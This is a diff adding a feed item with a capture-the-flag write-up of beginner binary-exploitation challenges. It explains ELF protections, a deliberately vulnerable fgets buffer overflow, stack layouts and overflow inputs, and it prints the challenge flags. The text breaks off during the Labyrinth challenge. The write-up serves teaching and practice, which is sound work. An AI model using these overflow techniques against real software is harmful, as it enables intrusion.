@@ -567,6 +567,633 @@
 &lt;h2 id="original-posts">Original Posts&lt;/h2>
 &lt;ul>
 &lt;li>&lt;a href="https://fazect.github.io/htb2023/" target="_blank" rel="noopener">From FazeCT&lt;/a>&lt;/li>
+&lt;/ul></description></item><item><title>Cyber Apocalypse 2023: The Cursed Mission - Pwnable</title><link>https://blog.bkisc.com/blog/bkisc/htb2023-pwn/</link><pubDate>Mon, 27 Mar 2023 00:00:00 +0000</pubDate><guid>https://blog.bkisc.com/blog/bkisc/htb2023-pwn/</guid><description>
+&lt;details class="toc-inpage d-print-none " open>
+&lt;summary class="font-weight-bold">Table of Contents&lt;/summary>
+&lt;nav id="TableOfContents">
+&lt;ul>
+&lt;li>&lt;a href="#initialise-connection">Initialise Connection&lt;/a>&lt;/li>
+&lt;li>&lt;a href="#questionnaire">Questionnaire&lt;/a>&lt;/li>
+&lt;li>&lt;a href="#getting-started">Getting Started&lt;/a>&lt;/li>
+&lt;li>&lt;a href="#labyrinth">Labyrinth&lt;/a>&lt;/li>
+&lt;li>&lt;a href="#pandoras-box">Pandora&amp;rsquo;s Box&lt;/a>&lt;/li>
+&lt;li>&lt;a href="#void">Void&lt;/a>&lt;/li>
+&lt;li>&lt;a href="#original-posts">Original Posts&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;/nav>
+&lt;/details>
+&lt;h2 id="initialise-connection">Initialise Connection&lt;/h2>
+&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>Description:&lt;/strong> In order to proceed, we need to start with the basics. Start an instance, connect to it via $ nc e.g. nc 127.0.0.1 1337 and send &amp;ldquo;1&amp;rdquo; to get the flag.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Note:&lt;/strong> This challenge had a docker but it might be closed at the time you are reading this. All needed files will be given in the write-ups.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Category:&lt;/strong> Binary Exploitation/Pwnable&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Difficulty:&lt;/strong> Very Easy&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;p>Just a sanity check challenge, do the same thing that is being stated in the description will grant you the flag.&lt;/p>
+&lt;img src="pwn1.png" alt="linux" width="1000"/>
+&lt;p>Flag is: &lt;strong>HTB{g3t_r34dy_f0r_s0m3_pwn}&lt;/strong>&lt;/p>
+&lt;h2 id="questionnaire">Questionnaire&lt;/h2>
+&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>Given file:&lt;/strong> &lt;a href="https://drive.google.com/file/d/1m_j9ApZJusGOgEvGl-32JRbFyk2fpPkH/view?usp=sharing" target="_blank" rel="noopener">Get it here!&lt;/a>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Description:&lt;/strong> It&amp;rsquo;s time to learn some things about binaries and basic c. Connect to a remote server and answer some questions to get the flag.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Note:&lt;/strong> This challenge had a docker but it might be closed at the time you are reading this. All needed files will be given in the write-ups.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Category:&lt;/strong> Binary Exploitation/Pwnable&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Difficulty:&lt;/strong> Very Easy&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;p>We are given a binary, a C file and a netcat server to answer some questions.&lt;/p>
+&lt;p>From the netcat, we are given some informations about the binary that we will going to work with.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">When compiling C/C++ source code in Linux, an ELF (Executable and Linkable Format) file is created.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">The flags added when compiling can affect the binary in various ways, like the protections.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Another thing affected can be the architecture and the way it&amp;#39;s linked.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">If the system in which the challenge is compiled is x86_64 and no flag is specified,
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">the ELF would be x86-64 / 64-bit. If it&amp;#39;s compiled with a flag to indicate the system,
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">it can be x86 / 32-bit binary.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">To reduce its size and make debugging more difficult, the binary can be stripped or not stripped.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Dynamic linking:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">A pointer to the linked file is included in the executable, and the file contents are not included
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">at link time. These files are used when the program is run.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Static linking:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">The code for all the routines called by your program becomes part of the executable file.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Stripped:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">The binary does not contain debugging information.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Not Stripped:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">The binary contains debugging information.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">The most common protections in a binary are:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Canary: A random value that is generated, put on the stack, and checked before that function is
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">left again. If the canary value is not correct-has been changed or overwritten, the application will
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">immediately stop.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">NX: Stands for non-executable segments, meaning we cannot write and execute code on the stack.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PIE: Stands for Position Independent Executable, which randomizes the base address of the binary
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">as it tells the loader which virtual address it should use.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">RelRO: Stands for Relocation Read-Only. The headers of the binary are marked as read-only.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Run the &amp;#39;file&amp;#39; command in the terminal and &amp;#39;checksec&amp;#39; inside the debugger.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">The output of &amp;#39;file&amp;#39; command:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">✗ file test
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">test: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked,
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=5a83587fbda6ad7b1aeee2d59f027a882bf2a429,
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">for GNU/Linux 3.2.0, not stripped.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">The output of &amp;#39;checksec&amp;#39; command:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">gef➤ checksec
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Canary : ✘
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">NX : ✓
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PIE : ✘
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Fortify : ✘
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">RelRO : Partial
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>We are able to answer some first questions using these informations.&lt;/p>
+&lt;img src="pwn2.png" alt="linux" width="1000"/>
+&lt;img src="pwn3.png" alt="linux" width="1000"/>
+&lt;img src="pwn4.png" alt="linux" width="1000"/>
+&lt;img src="pwn5.png" alt="linux" width="1000"/>
+&lt;p>After answering these questions correctly, we are provided with more informations about the binary.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">Great job so far! Now it&amp;#39;s time to see some C code and a binary file.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">In the pwn_questionnaire.zip there are two files:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">1. test.c
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">2. test
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">The &amp;#39;test.c&amp;#39; is the source code and &amp;#39;test&amp;#39; is the output binary.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Let&amp;#39;s start by analyzing the code.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">First of all, let&amp;#39;s focus on the &amp;#39;#include &amp;lt;stdio.h&amp;gt;&amp;#39; line.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">It includes the &amp;#39;stdio.h&amp;#39; header file to use some of the standard functions like &amp;#39;printf()&amp;#39;.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">The same principle applies for the &amp;#39;#include &amp;lt;stdlib.h&amp;gt;&amp;#39; line, for other functions like &amp;#39;system()&amp;#39;.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Now, let&amp;#39;s take a closer look at:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">void main(){
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> vuln();
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">}
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">By default, a binary file starts executing from the &amp;#39;main()&amp;#39; function.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">In this case, &amp;#39;main()&amp;#39; only calls another function, &amp;#39;vuln()&amp;#39;.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">The function &amp;#39;vuln()&amp;#39; has 3 lines.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">void vuln(){
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> char buffer[0x20] = {0};
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> fprintf(stdout, &amp;#34;\nEnter payload here: &amp;#34;);
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> fgets(buffer, 0x100, stdin);
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">}
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">The first line declares a 0x20-byte buffer of characters and fills it with zeros.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">The second line calls &amp;#39;fprintf()&amp;#39; to print a message to stdout.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Finally, the third line calls &amp;#39;fgets()&amp;#39; to read 0x100 bytes from stdin and store them to the
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">aformentioned buffer.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Then, there is a custom &amp;#39;gg()&amp;#39; function which calls the standard &amp;#39;system()&amp;#39; function to print the
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">flag. This function is never called by default.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">void gg(){
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> system(&amp;#34;cat flag.txt&amp;#34;);
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">}
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Run the &amp;#39;man &amp;lt;function_name&amp;gt;&amp;#39; command to see the manual page of a standard function (e.g. man fgets).
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>We are also able to answer some next questions using these informations.&lt;/p>
+&lt;img src="pwn6.png" alt="linux" width="1000"/>
+&lt;img src="pwn7.png" alt="linux" width="1000"/>
+&lt;img src="pwn8.png" alt="linux" width="1000"/>
+&lt;p>After answering these questions correctly, we are provided with MORE and MORE informations about the binary.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">Excellent! Now it&amp;#39;s time to talk about Buffer Overflows.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Buffer Overflow means there is a buffer of characters, integers or any other type of variables,
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">and someone inserts into this buffer more bytes than it can store.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">If the user inserts more bytes than the buffer&amp;#39;s size, they will be stored somewhere in the memory
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">after the address of the buffer, overwriting important addresses for the flow of the program.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">This, in most cases, will make the program crash.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">When a function is called, the program knows where to return because of the &amp;#39;return address&amp;#39;. If the
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">player overwrites this address, they can redirect the flow of the program wherever they want.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">To print a function&amp;#39;s address, run &amp;#39;p &amp;lt;function_name&amp;gt;&amp;#39; inside &amp;#39;gdb&amp;#39;. (e.g. p main)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">gef➤ p gg
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$1 = {&amp;lt;text variable, no debug info&amp;gt;} 0x401176 &amp;lt;gg&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">To perform a Buffer Overflow in the simplest way, we take these things into consideration.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">1. Canary is disabled so it won&amp;#39;t quit after the canary address is overwritten.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">2. PIE is disabled so the addresses of the binary functions are not randomized and the user knows
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> where to return after overwritting the return address.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3. There is a buffer with N size.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">4. There is a function that reads to this buffer more than N bytes.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Run printf &amp;#39;A%.0s&amp;#39; {1..30} | ./test to enter 30*&amp;#34;A&amp;#34; into the program.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Run the program manually with &amp;#34;./test&amp;#34; and insert 30*A, then 39, then 40 and see what happens.
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>We are able to answer some next questions using these informations.&lt;/p>
+&lt;img src="pwn9.png" alt="linux" width="1000"/>
+&lt;img src="pwn10.png" alt="linux" width="1000"/>
+&lt;p>For the above question, you can try out to see for yourself.&lt;/p>
+&lt;img src="pwn11.png" alt="linux" width="1000"/>
+&lt;p>And there is our flag!&lt;/p>
+&lt;img src="pwn12.png" alt="linux" width="1000"/>
+&lt;p>Flag is: &lt;strong>HTB{th30ry_bef0r3_4cti0n}&lt;/strong>&lt;/p>
+&lt;h2 id="getting-started">Getting Started&lt;/h2>
+&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>Given file:&lt;/strong> &lt;a href="https://drive.google.com/file/d/1WbbUvsAAZ--CfdrHmOggCGuLa8q_rzuV/view?usp=sharing" target="_blank" rel="noopener">Get it here!&lt;/a>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Description:&lt;/strong> Get ready for the last guided challenge and your first real exploit. It&amp;rsquo;s time to show your hacking skills.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Note:&lt;/strong> This challenge had a docker but it might be closed at the time you are reading this. All needed files will be given in the write-ups.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Category:&lt;/strong> Binary Exploitation/Pwnable&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Difficulty:&lt;/strong> Very Easy&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;p>We are given a binary, a C file and a netcat server to work with.&lt;/p>
+&lt;p>Same with the above challenge, netcat tells us to fill in some questions.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">Stack frame layout
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| . | &amp;lt;- Higher addresses
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| . |
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_____________|
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| | &amp;lt;- 64 bytes
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Return addr |
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_____________|
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| | &amp;lt;- 56 bytes
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| RBP |
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_____________|
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| | &amp;lt;- 48 bytes
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| target |
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_____________|
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| | &amp;lt;- 40 bytes
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| alignment |
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_____________|
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| | &amp;lt;- 32 bytes
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Buffer[31] |
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_____________|
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| . |
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| . |
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_____________|
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| |
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Buffer[0] |
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_____________| &amp;lt;- Lower addresses
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> [Addr] | [Value]
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-------------------+-------------------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x00007fff1ca33230 | 0x0000000000000000 &amp;lt;- Start of buffer
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x00007fff1ca33238 | 0x0000000000000000
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x00007fff1ca33240 | 0x0000000000000000
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x00007fff1ca33248 | 0x0000000000000000
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x00007fff1ca33250 | 0x6969696969696969 &amp;lt;- Dummy value for alignment
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x00007fff1ca33258 | 0x00000000deadbeef &amp;lt;- Target to change
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x00007fff1ca33260 | 0x000055cf39fcf800 &amp;lt;- Saved rbp
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x00007fff1ca33268 | 0x00007f62c548ac87 &amp;lt;- Saved return address
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x00007fff1ca33270 | 0x0000000000000001
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x00007fff1ca33278 | 0x00007fff1ca33348
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">After we insert 4 &amp;#34;A&amp;#34;s, (the hex representation of A is 0x41), the stack layout like this:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> [Addr] | [Value]
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-------------------+-------------------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x00007fff1ca33230 | 0x0000000041414141 &amp;lt;- Start of buffer
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x00007fff1ca33238 | 0x0000000000000000
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x00007fff1ca33240 | 0x0000000000000000
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x00007fff1ca33248 | 0x0000000000000000
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x00007fff1ca33250 | 0x6969696969696969 &amp;lt;- Dummy value for alignment
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x00007fff1ca33258 | 0x00000000deadbeef &amp;lt;- Target to change
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x00007fff1ca33260 | 0x000055cf39fcf800 &amp;lt;- Saved rbp
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x00007fff1ca33268 | 0x00007f62c548ac87 &amp;lt;- Saved return address
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x00007fff1ca33270 | 0x0000000000000001
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x00007fff1ca33278 | 0x00007fff1ca33348
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">After we insert 4 &amp;#34;B&amp;#34;s, (the hex representation of B is 0x42), the stack layout looks like this:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> [Addr] | [Value]
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-------------------+-------------------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x00007fff1ca33230 | 0x4242424241414141 &amp;lt;- Start of buffer
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x00007fff1ca33238 | 0x0000000000000000
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x00007fff1ca33240 | 0x0000000000000000
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x00007fff1ca33248 | 0x0000000000000000
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x00007fff1ca33250 | 0x6969696969696969 &amp;lt;- Dummy value for alignment
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x00007fff1ca33258 | 0x00000000deadbeef &amp;lt;- Target to change
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x00007fff1ca33260 | 0x000055cf39fcf800 &amp;lt;- Saved rbp
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x00007fff1ca33268 | 0x00007f62c548ac87 &amp;lt;- Saved return address
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x00007fff1ca33270 | 0x0000000000000001
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x00007fff1ca33278 | 0x00007fff1ca33348
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>From the netcat, we are provided with these informations.&lt;/p>
+&lt;p>We can answer the question by looking at the informations given, where we have to overwrite the alignment address and the &amp;ldquo;target&amp;rsquo;s&amp;rdquo; 0xdeadbeef value.&lt;/p>
+&lt;p>From the stack layout given above, we can see that to fully overwrite, we need at least 40 bytes input (assume that we use Linux terminal because there will be a \x00 overwrite at the right of the &amp;ldquo;target&amp;rsquo;s&amp;rdquo; 0xdeadbeef value) which will look like this.&lt;/p>
+&lt;img src="pwn13.png" alt="linux" width="1000"/>
+&lt;p>I don&amp;rsquo;t know why it prints out &lt;strong>&amp;quot;[-] You failed!&amp;quot;&lt;/strong> though&amp;hellip;&lt;/p>
+&lt;p>Flag is: &lt;strong>HTB{b0f_s33m5_3z_r1ght?}&lt;/strong>&lt;/p>
+&lt;h2 id="labyrinth">Labyrinth&lt;/h2>
+&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>Given file:&lt;/strong> &lt;a href="https://github.com/padolex/misc/blob/main/pwn_labyrinth.zip" target="_blank" rel="noopener">Get it here!&lt;/a>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Description:&lt;/strong> You find yourself trapped in a mysterious labyrinth, with only one chance to escape. Choose the correct door wisely, for the wrong choice could have deadly consequences.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Note:&lt;/strong> This challenge had a docker but it might be closed at the time you are reading this. All needed files will be given in the write-ups.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Category:&lt;/strong> Binary Exploitation/Pwnable&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Difficulty:&lt;/strong> Easy&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;p>Examine the binary with command &lt;code>checksec&lt;/code>&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-zsh" data-lang="zsh">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> &lt;span class="s1">&amp;#39;~/pwn_labyrinth/challenge/labyrinth&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Arch: amd64-64-little
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> RELRO: Full RELRO
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Stack: No canary found
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> NX: NX enabled
